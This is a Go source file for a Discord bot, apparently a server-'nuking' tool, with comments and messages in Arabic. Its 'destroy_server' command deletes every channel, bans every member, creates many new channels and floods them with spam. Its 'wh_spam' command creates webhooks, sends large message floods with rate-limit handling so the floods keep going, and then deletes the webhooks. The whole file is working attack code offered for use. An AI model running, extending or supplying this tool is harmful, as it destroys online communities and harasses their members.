package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/signal"
	"strconv"
	"sync"
	"syscall"
	"time"

	"github.com/bwmarrin/discordgo"
)

var client = &http.Client{
	Timeout: 10 * time.Second,
}

func main() {
	token := os.Getenv("MASTERGUARD_TOKEN")
	if token == "" {
		fmt.Println("❌ خطأ: لم يتم العثور على التوكن في متغير البيئة MASTERGUARD_TOKEN")
		return
	}

	sess, err := discordgo.New("Bot " + token)
	if err != nil {
		fmt.Println("خطأ في إنشاء جلسة البوت:", err)
		return
	}

	sess.Identify.Intents = discordgo.IntentsGuilds | discordgo.IntentsGuildMembers | discordgo.IntentsAll

	cmdDestroy := "destroy_server"
	commandDestroy := &discordgo.ApplicationCommand{
		Name:        cmdDestroy,
		Description: "أمر تدمير السيرفر",
		Options: []*discordgo.ApplicationCommandOption{
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "room_name",
				Description: "اسم الرومات الجديدة",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionInteger,
				Name:        "rooms_count",
				Description: "عدد الرومات المراد إنشاؤها",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "message_content",
				Description: "محتوى رسالة السبام",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionInteger,
				Name:        "messages_count",
				Description: "عدد الرسائل في كل روم",
				Required:    true,
			},
		},
	}

	cmdWhSpam := "wh_spam"
	commandWhSpam := &discordgo.ApplicationCommand{
		Name:        cmdWhSpam,
		Description: "سبام ويب هوك مع نظام Rate Limit الذكي من ديسكورد",
		Options: []*discordgo.ApplicationCommandOption{
			{
				Type:        discordgo.ApplicationCommandOptionChannel,
				Name:        "channel",
				Description: "الروم المراد إرسال الرسائل فيها",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "message_content",
				Description: "محتوى الرسالة",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "webhook_name",
				Description: "اسم الويب هوك",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionInteger,
				Name:        "messages_count",
				Description: "عدد الرسائل الإجمالي للسبام",
				Required:    true,
			},
		},
	}

	sess.AddHandler(func(s *discordgo.Session, i *discordgo.InteractionCreate) {
		if i.Type != discordgo.InteractionApplicationCommand {
			return
		}

		cmdName := i.ApplicationCommandData().Name

		if cmdName == cmdDestroy {
			if (i.Member.Permissions & discordgo.PermissionAdministrator) == 0 {
				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
					Type: discordgo.InteractionResponseChannelMessageWithSource,
					Data: &discordgo.InteractionResponseData{
						Content: "❌ يجب أن تكون مشرفاً.",
						Flags:   discordgo.MessageFlagsEphemeral,
					},
				})
				return
			}

			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "🚀 جاري تنفيذ التدمير...",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})

			options := i.ApplicationCommandData().Options
			optionMap := make(map[string]*discordgo.ApplicationCommandInteractionDataOption)
			for _, opt := range options {
				optionMap[opt.Name] = opt
			}

			roomName := optionMap["room_name"].StringValue()
			roomsCount := int(optionMap["rooms_count"].IntValue())
			messageContent := optionMap["message_content"].StringValue()
			messagesCount := int(optionMap["messages_count"].IntValue())
			guildID := i.GuildID

			go executeDestruction(s, token, guildID, roomName, roomsCount, messageContent, messagesCount)

		} else if cmdName == cmdWhSpam {
			if (i.Member.Permissions & discordgo.PermissionAdministrator) == 0 {
				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
					Type: discordgo.InteractionResponseChannelMessageWithSource,
					Data: &discordgo.InteractionResponseData{
						Content: "❌ يجب أن تكون مشرفاً.",
						Flags:   discordgo.MessageFlagsEphemeral,
					},
				})
				return
			}

			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "🚀 تم بدء عملية سبام الويب هوكات بنجاح...",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})

			options := i.ApplicationCommandData().Options
			optionMap := make(map[string]*discordgo.ApplicationCommandInteractionDataOption)
			for _, opt := range options {
				optionMap[opt.Name] = opt
			}

			channelID := optionMap["channel"].ChannelValue(s).ID
			messageContent := optionMap["message_content"].StringValue()
			webhookName := optionMap["webhook_name"].StringValue()
			messagesCount := int(optionMap["messages_count"].IntValue())

			go executeWebhookSpamLoop(s, token, channelID, webhookName, messageContent, messagesCount)
		}
	})

	err = sess.Open()
	if err != nil {
		fmt.Println("خطأ:", err)
		return
	}

	_, _ = sess.ApplicationCommandCreate(sess.State.User.ID, "", commandDestroy)
	_, _ = sess.ApplicationCommandCreate(sess.State.User.ID, "", commandWhSpam)

	fmt.Println("🤖 البوت شغال وجاهز!")

	stop := make(chan os.Signal, 1)
	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	<-stop

	sess.Close()
}

func executeDestruction(s *discordgo.Session, token, guildID, roomName string, roomsCount int, messageContent string, messagesCount int) {
	headers := map[string]string{
		"Authorization": "Bot " + token,
		"Content-Type":  "application/json",
	}

	go func() {
		req, _ := http.NewRequest("GET", "https://discord.com/api/v10/guilds/"+guildID+"/channels", nil)
		for k, v := range headers {
			req.Header.Set(k, v)
		}
		resp, err := client.Do(req)
		if err != nil {
			return
		}
		defer resp.Body.Close()

		var channels []map[string]interface{}
		json.NewDecoder(resp.Body).Decode(&channels)

		for _, ch := range channels {
			if id, ok := ch["id"].(string); ok {
				go func(chID string) {
					delReq, _ := http.NewRequest("DELETE", "https://discord.com/api/v10/channels/"+chID, nil)
					for k, v := range headers {
						delReq.Header.Set(k, v)
					}
					if r, e := client.Do(delReq); e == nil {
						r.Body.Close()
					}
				}(id)
			}
		}
	}()

	go func() {
		var userIDs []string
		after := ""
		for {
			members, err := s.GuildMembers(guildID, after, 1000)
			if err != nil || len(members) == 0 {
				break
			}
			for _, member := range members {
				userIDs = append(userIDs, member.User.ID)
				after = member.User.ID
			}
			if len(members) < 1000 {
				break
			}
		}

		go func() {
			for _, uID := range userIDs {
				s.GuildBanCreate(guildID, uID, 0)
			}
		}()
	}()

	var channelIDs []string
	var mu sync.Mutex
	var wg sync.WaitGroup

	for i := 0; i < roomsCount; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			payload, _ := json.Marshal(map[string]interface{}{
				"name": roomName,
				"type": 0,
			})
			req, _ := http.NewRequest("POST", "https://discord.com/api/v10/guilds/"+guildID+"/channels", bytes.NewBuffer(payload))
			for k, v := range headers {
				req.Header.Set(k, v)
			}

			resp, err := client.Do(req)
			if err != nil {
				return
			}
			defer resp.Body.Close()

			if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusCreated {
				var chResult map[string]interface{}
				json.NewDecoder(resp.Body).Decode(&chResult)
				if chID, ok := chResult["id"].(string); ok {
					mu.Lock()
					channelIDs = append(channelIDs, chID)
					mu.Unlock()
				}
			}
		}()
	}
	wg.Wait()

	for _, chID := range channelIDs {
		go func(cID string) {
			for m := 0; m < messagesCount; m++ {
				msgPayload, _ := json.Marshal(map[string]string{"content": messageContent})
				msgReq, _ := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+cID+"/messages", bytes.NewBuffer(msgPayload))
				for k, v := range headers {
					msgReq.Header.Set(k, v)
				}

				msgResp, err := client.Do(msgReq)
				if err == nil {
					msgResp.Body.Close()
				}
			}
		}(chID)
	}
}

func executeWebhookSpamLoop(s *discordgo.Session, token, channelID, webhookName, messageContent string, messagesCount int) {
	headers := map[string]string{
		"Authorization": "Bot " + token,
		"Content-Type":  "application/json",
	}

	s.ChannelMessageSend(channelID, "🔄 جاري إنشاء 5 ويب هوكات للسبام...")

	var activeURLs []string
	var createWg sync.WaitGroup
	var mu sync.Mutex

	for i := 0; i < 5; i++ {
		createWg.Add(1)
		go func() {
			defer createWg.Done()
			payload, _ := json.Marshal(map[string]string{"name": webhookName})
			req, _ := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+channelID+"/webhooks", bytes.NewBuffer(payload))
			for k, v := range headers {
				req.Header.Set(k, v)
			}

			resp, err := client.Do(req)
			if err != nil {
				return
			}
			defer resp.Body.Close()

			if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusCreated {
				var wh map[string]interface{}
				if err := json.NewDecoder(resp.Body).Decode(&wh); err == nil {
					if id, ok := wh["id"].(string); ok {
						if tkn, ok := wh["token"].(string); ok {
							url := fmt.Sprintf("https://discord.com/api/v10/webhooks/%s/%s", id, tkn)
							mu.Lock()
							activeURLs = append(activeURLs, url)
							mu.Unlock()
						}
					}
				}
			}
		}()
	}
	createWg.Wait()

	if len(activeURLs) == 0 {
		s.ChannelMessageSend(channelID, "⚠️ فشل إنشاء الويب هوكات.")
		return
	}

	s.ChannelMessageSend(channelID, fmt.Sprintf("🚀 جاري إرسال %d رسالة بنظام توقيت ديسكورد الذكي...", messagesCount))

	perWebhook := messagesCount / len(activeURLs)
	remainder := messagesCount % len(activeURLs)

	var spamWg sync.WaitGroup
	for idx, url := range activeURLs {
		spamWg.Add(1)
		targetCount := perWebhook
		if idx == 0 {
			targetCount += remainder
		}

		go func(whURL string, count int) {
			defer spamWg.Done()
			for m := 0; m < count; m++ {
				for {
					msgPayload, _ := json.Marshal(map[string]string{"content": messageContent})
					// استخدام ?wait=true لتأكيد الاستلام وقراءة وقت الانتظار بدقة من ديسكورد
					req, _ := http.NewRequest("POST", whURL+"?wait=true", bytes.NewBuffer(msgPayload))
					req.Header.Set("Content-Type", "application/json")

					resp, err := client.Do(req)
					if err != nil {
						time.Sleep(100 * time.Millisecond)
						continue
					}

					// إذا تم إرسال الرسالة بنجاح تام
					if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusCreated {
						resp.Body.Close()
						break // انتقل للرسالة التالية
					}

					// إذا حصلت على Rate Limit (كود 429)، اقرأ الوقت اللي يطلبه ديسكورد بالظبط
					if resp.StatusCode == 429 {
						retryAfterStr := resp.Header.Get("Retry-After")
						resp.Body.Close()

						sleepDuration := 1 * time.Second // احتياطي لو ما رجع الهيدر
						if retryAfterStr != "" {
							if seconds, err := strconv.ParseFloat(retryAfterStr, 64); err == nil {
								// ديسكورد أحياناً يرجع الثواني بشكل عشري (مثل 1.2 ثانية)
								sleepDuration = time.Duration(seconds * float64(time.Second))
							}
						}
						// انتظر بالضبط الفترة اللي حددها ديسكورد ولا دقيقة زيادة
						time.Sleep(sleepDuration)
						continue // أعد المحاولة بعد انقضاء الوقت المطلوب بالضبط
					}

					resp.Body.Close()
					time.Sleep(200 * time.Millisecond)
					break
				}
			}
		}(url, targetCount)
	}

	// انتظار قاطع لا يعطي إشعار الاكتمال إلا بعد انتهاء آخر رسالة تماماً
	spamWg.Wait()

	s.ChannelMessageSend(channelID, "⏳ جاري حذف الويب هوكات وتنظيف المكان...")

	var deleteWg sync.WaitGroup
	for _, url := range activeURLs {
		deleteWg.Add(1)
		go func(whURL string) {
			defer deleteWg.Done()
			req, _ := http.NewRequest("DELETE", whURL, nil)
			resp, err := client.Do(req)
			if err == nil {
				resp.Body.Close()
			}
		}(url)
	}
	deleteWg.Wait()

	s.ChannelMessageSend(channelID, "🎉 اكتمل العدد المطلوب تماماً وبدون أي نقص!")
}
